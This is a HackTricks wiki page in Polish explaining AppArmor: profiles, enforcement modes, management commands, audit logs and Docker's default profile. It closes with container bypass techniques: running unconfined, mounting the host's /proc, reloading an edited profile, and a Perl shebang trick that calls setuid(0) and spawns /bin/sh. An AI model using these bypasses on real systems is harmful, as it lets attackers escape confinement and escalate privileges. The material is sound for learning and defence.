# AppArmor

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Basic Information

AppArmor to **ulepszony kernel zaprojektowany w celu ograniczenia zasobów dostępnych dla programów poprzez profile dla każdego programu**, skutecznie wdrażając Mandatory Access Control (MAC) poprzez powiązanie atrybutów kontroli dostępu bezpośrednio z programami zamiast użytkowników. System ten działa poprzez **ładowanie profili do jądra**, zazwyczaj podczas uruchamiania, a te profile określają, jakie zasoby program może uzyskać, takie jak połączenia sieciowe, dostęp do surowych gniazd i uprawnienia do plików.

Są dwa tryby operacyjne dla profili AppArmor:

* **Tryb egzekwowania**: Ten tryb aktywnie egzekwuje zasady zdefiniowane w profilu, blokując działania, które naruszają te zasady i rejestrując wszelkie próby ich naruszenia za pomocą systemów takich jak syslog lub auditd.
* **Tryb skarg**: W przeciwieństwie do trybu egzekwowania, tryb skarg nie blokuje działań, które są sprzeczne z zasadami profilu. Zamiast tego rejestruje te próby jako naruszenia zasad bez egzekwowania ograniczeń.

### Components of AppArmor

* **Moduł jądra**: Odpowiedzialny za egzekwowanie zasad.
* **Zasady**: Określają zasady i ograniczenia dotyczące zachowania programów i dostępu do zasobów.
* **Parser**: Ładuje zasady do jądra w celu egzekwowania lub raportowania.
* **Narzędzia**: To programy w trybie użytkownika, które zapewniają interfejs do interakcji i zarządzania AppArmor.

### Profiles path

Profile AppArmor są zazwyczaj zapisywane w _**/etc/apparmor.d/**_\
Za pomocą `sudo aa-status` będziesz mógł wylistować binaria, które są ograniczone przez jakiś profil. Jeśli zmienisz znak "/" na kropkę w ścieżce każdego wymienionego binarnego, uzyskasz nazwę profilu AppArmor w wymienionym folderze.

Na przykład, profil **apparmor** dla _/usr/bin/man_ będzie znajdował się w _/etc/apparmor.d/usr.bin.man_

### Commands
```bash
aa-status     #check the current status
aa-enforce    #set profile to enforce mode (from disable or complain)
aa-complain   #set profile to complain mode (from diable or enforcement)
apparmor_parser #to load/reload an altered policy
aa-genprof    #generate a new profile
aa-logprof    #used to change the policy when the binary/program is changed
aa-mergeprof  #used to merge the policies
```
## Tworzenie profilu

* Aby wskazać dotknięty plik wykonywalny, **dozwolone są ścieżki bezwzględne i znaki wieloznaczne** do określania plików.
* Aby wskazać dostęp, jaki binarny plik będzie miał do **plików**, można użyć następujących **kontroli dostępu**:
* **r** (odczyt)
* **w** (zapis)
* **m** (mapowanie pamięci jako wykonywalne)
* **k** (blokowanie plików)
* **l** (tworzenie twardych linków)
* **ix** (wykonanie innego programu z nowym programem dziedziczącym politykę)
* **Px** (wykonanie pod innym profilem, po oczyszczeniu środowiska)
* **Cx** (wykonanie pod profilem potomnym, po oczyszczeniu środowiska)
* **Ux** (wykonanie bez ograniczeń, po oczyszczeniu środowiska)
* **Zmienne** mogą być definiowane w profilach i mogą być manipulowane z zewnątrz profilu. Na przykład: @{PROC} i @{HOME} (dodaj #include \<tunables/global> do pliku profilu)
* **Reguły odmowy są obsługiwane, aby nadpisać reguły zezwolenia**.

### aa-genprof

Aby łatwo rozpocząć tworzenie profilu, apparmor może Ci pomóc. Możliwe jest, aby **apparmor sprawdzał działania wykonywane przez plik binarny, a następnie pozwolił Ci zdecydować, które działania chcesz zezwolić lub odmówić**.\
Musisz tylko uruchomić:
```bash
sudo aa-genprof /path/to/binary
```
Następnie, w innej konsoli wykonaj wszystkie działania, które zazwyczaj wykonuje binarny plik:
```bash
/path/to/binary -a dosomething
```
Następnie, w pierwszej konsoli naciśnij "**s**", a następnie w zarejestrowanych akcjach wskaż, czy chcesz zignorować, zezwolić, czy cokolwiek innego. Gdy skończysz, naciśnij "**f**", a nowy profil zostanie utworzony w _/etc/apparmor.d/path.to.binary_

{% hint style="info" %}
Używając klawiszy strzałek, możesz wybrać, co chcesz zezwolić/odmówić/cokolwiek innego
{% endhint %}

### aa-easyprof

Możesz również stworzyć szablon profilu apparmor dla binarnego pliku za pomocą:
```bash
sudo aa-easyprof /path/to/binary
# vim:syntax=apparmor
# AppArmor policy for binary
# ###AUTHOR###
# ###COPYRIGHT###
# ###COMMENT###

#include <tunables/global>

# No template variables specified

"/path/to/binary" {
#include <abstractions/base>

# No abstractions specified

# No policy groups specified

# No read paths specified

# No write paths specified
}
```
{% hint style="info" %}
Zauważ, że domyślnie w utworzonym profilu nic nie jest dozwolone, więc wszystko jest zabronione. Będziesz musiał dodać linie takie jak `/etc/passwd r,` aby zezwolić na odczyt binarnego pliku `/etc/passwd`, na przykład.
{% endhint %}

Możesz następnie **wymusić** nowy profil za pomocą
```bash
sudo apparmor_parser -a /etc/apparmor.d/path.to.binary
```
### Modyfikowanie profilu na podstawie logów

Narzędzie to odczyta logi i zapyta użytkownika, czy chce zezwolić na niektóre z wykrytych zabronionych działań:
```bash
sudo aa-logprof
```
{% hint style="info" %}
Używając klawiszy strzałek, możesz wybrać, co chcesz zezwolić/odmówić/cokolwiek
{% endhint %}

### Zarządzanie profilem
```bash
#Main profile management commands
apparmor_parser -a /etc/apparmor.d/profile.name #Load a new profile in enforce mode
apparmor_parser -C /etc/apparmor.d/profile.name #Load a new profile in complain mode
apparmor_parser -r /etc/apparmor.d/profile.name #Replace existing profile
apparmor_parser -R /etc/apparmor.d/profile.name #Remove profile
```
## Logs

Przykład logów **AUDIT** i **DENIED** z _/var/log/audit/audit.log_ wykonywalnego **`service_bin`**:
```bash
type=AVC msg=audit(1610061880.392:286): apparmor="AUDIT" operation="getattr" profile="/bin/rcat" name="/dev/pts/1" pid=954 comm="service_bin" requested_mask="r" fsuid=1000 ouid=1000
type=AVC msg=audit(1610061880.392:287): apparmor="DENIED" operation="open" profile="/bin/rcat" name="/etc/hosts" pid=954 comm="service_bin" requested_mask="r" denied_mask="r" fsuid=1000 ouid=0
```
Możesz również uzyskać te informacje za pomocą:
```bash
sudo aa-notify -s 1 -v
Profile: /bin/service_bin
Operation: open
Name: /etc/passwd
Denied: r
Logfile: /var/log/audit/audit.log

Profile: /bin/service_bin
Operation: open
Name: /etc/hosts
Denied: r
Logfile: /var/log/audit/audit.log

AppArmor denials: 2 (since Wed Jan  6 23:51:08 2021)
For more information, please see: https://wiki.ubuntu.com/DebuggingApparmor
```
## Apparmor w Dockerze

Zauważ, jak profil **docker-profile** Dockera jest ładowany domyślnie:
```bash
sudo aa-status
apparmor module is loaded.
50 profiles are loaded.
13 profiles are in enforce mode.
/sbin/dhclient
/usr/bin/lxc-start
/usr/lib/NetworkManager/nm-dhcp-client.action
/usr/lib/NetworkManager/nm-dhcp-helper
/usr/lib/chromium-browser/chromium-browser//browser_java
/usr/lib/chromium-browser/chromium-browser//browser_openjdk
/usr/lib/chromium-browser/chromium-browser//sanitized_helper
/usr/lib/connman/scripts/dhclient-script
docker-default
```
Domyślnie **profil docker-default Apparmor** jest generowany z [https://github.com/moby/moby/tree/master/profiles/apparmor](https://github.com/moby/moby/tree/master/profiles/apparmor)

**Podsumowanie profilu docker-default**:

* **Dostęp** do całej **sieci**
* **Brak możliwości** jest zdefiniowany (Jednakże, niektóre możliwości będą pochodzić z podstawowych reguł bazowych t.j. #include \<abstractions/base>)
* **Pisanie** do jakiegokolwiek pliku **/proc** jest **niedozwolone**
* Inne **podkatalogi**/**pliki** w /**proc** i /**sys** mają **zabroniony** dostęp do odczytu/zapisu/blokady/linkowania/wykonywania
* **Montowanie** jest **niedozwolone**
* **Ptrace** może być uruchamiane tylko na procesie, który jest ograniczony przez **ten sam profil apparmor**

Gdy **uruchomisz kontener docker**, powinieneś zobaczyć następujący wynik:
```bash
1 processes are in enforce mode.
docker-default (825)
```
Zauważ, że **apparmor nawet zablokuje uprawnienia do możliwości** przyznane kontenerowi domyślnie. Na przykład, będzie w stanie **zablokować pozwolenie na zapis w /proc, nawet jeśli przyznana jest możliwość SYS\_ADMIN**, ponieważ domyślny profil apparmor dla dockera odmawia tego dostępu:
```bash
docker run -it --cap-add SYS_ADMIN --security-opt seccomp=unconfined ubuntu /bin/bash
echo "" > /proc/stat
sh: 1: cannot create /proc/stat: Permission denied
```
Musisz **wyłączyć apparmor**, aby obejść jego ograniczenia:
```bash
docker run -it --cap-add SYS_ADMIN --security-opt seccomp=unconfined --security-opt apparmor=unconfined ubuntu /bin/bash
```
Zauważ, że domyślnie **AppArmor** również **zabrania kontenerowi montowania** folderów od wewnątrz, nawet z uprawnieniem SYS\_ADMIN.

Zauważ, że możesz **dodać/usunąć** **uprawnienia** do kontenera docker (to będzie nadal ograniczone przez metody ochrony takie jak **AppArmor** i **Seccomp**):

* `--cap-add=SYS_ADMIN` nadaje uprawnienie `SYS_ADMIN`
* `--cap-add=ALL` nadaje wszystkie uprawnienia
* `--cap-drop=ALL --cap-add=SYS_PTRACE` usuwa wszystkie uprawnienia i nadaje tylko `SYS_PTRACE`

{% hint style="info" %}
Zazwyczaj, gdy **znajdziesz**, że masz **uprzywilejowane uprawnienie** dostępne **wewnątrz** kontenera **docker**, **ale** część **eksploatu nie działa**, będzie to spowodowane tym, że **apparmor docker będzie to uniemożliwiać**.
{% endhint %}

### Przykład

(Przykład z [**tutaj**](https://sreeninet.wordpress.com/2016/03/06/docker-security-part-2docker-engine/))

Aby zilustrować funkcjonalność AppArmor, stworzyłem nowy profil Docker “mydocker” z dodaną następującą linią:
```
deny /etc/* w,   # deny write for all files directly in /etc (not in a subdir)
```
Aby aktywować profil, musimy wykonać następujące kroki:
```
sudo apparmor_parser -r -W mydocker
```
Aby wyświetlić profile, możemy użyć następującego polecenia. Poniższe polecenie wyświetla mój nowy profil AppArmor.
```
$ sudo apparmor_status  | grep mydocker
mydocker
```
Jak pokazano poniżej, otrzymujemy błąd podczas próby zmiany „/etc/”, ponieważ profil AppArmor uniemożliwia dostęp do zapisu do „/etc”.
```
$ docker run --rm -it --security-opt apparmor:mydocker -v ~/haproxy:/localhost busybox chmod 400 /etc/hostname
chmod: /etc/hostname: Permission denied
```
### AppArmor Docker Bypass1

Możesz znaleźć, który **profil apparmor działa w kontenerze** używając:
```bash
docker inspect 9d622d73a614 | grep lowpriv
"AppArmorProfile": "lowpriv",
"apparmor=lowpriv"
```
Następnie możesz uruchomić następującą linię, aby **znaleźć dokładny profil używany**:
```bash
find /etc/apparmor.d/ -name "*lowpriv*" -maxdepth 1 2>/dev/null
```
W dziwnym przypadku możesz **zmodyfikować profil docker apparmor i go przeładować.** Możesz usunąć ograniczenia i "obejść" je.

### AppArmor Docker Bypass2

**AppArmor jest oparty na ścieżkach**, co oznacza, że nawet jeśli może **chronić** pliki w katalogu takim jak **`/proc`**, jeśli możesz **skonfigurować, jak kontener ma być uruchomiony**, możesz **zamontować** katalog proc hosta wewnątrz **`/host/proc`** i **nie będzie już chroniony przez AppArmor**.

### AppArmor Shebang Bypass

W [**tym błędzie**](https://bugs.launchpad.net/apparmor/+bug/1911431) możesz zobaczyć przykład, jak **nawet jeśli zapobiegasz uruchamianiu perla z określonymi zasobami**, jeśli po prostu stworzysz skrypt powłoki **określając** w pierwszej linii **`#!/usr/bin/perl`** i **wykonasz plik bezpośrednio**, będziesz mógł wykonać cokolwiek chcesz. Np.:
```perl
echo '#!/usr/bin/perl
use POSIX qw(strftime);
use POSIX qw(setuid);
POSIX::setuid(0);
exec "/bin/sh"' > /tmp/test.pl
chmod +x /tmp/test.pl
/tmp/test.pl
```
{% hint style="success" %}
Ucz się i ćwicz Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Ucz się i ćwicz Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Wsparcie dla HackTricks</summary>

* Sprawdź [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Dziel się trikami hackingowymi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytoriów na githubie.

</details>
{% endhint %}
